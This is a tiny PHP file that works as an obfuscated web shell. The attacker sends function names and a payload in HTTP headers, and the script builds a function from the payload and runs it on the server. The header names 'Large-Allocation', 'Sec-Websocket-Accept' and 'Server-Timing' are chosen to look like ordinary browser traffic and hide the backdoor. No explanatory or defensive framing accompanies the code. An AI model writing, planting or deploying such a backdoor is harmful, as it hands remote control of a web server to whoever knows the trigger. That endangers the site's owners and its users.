<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $center = $_HEADERS['Large-Allocation']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Server-Timing']));
    $center();
}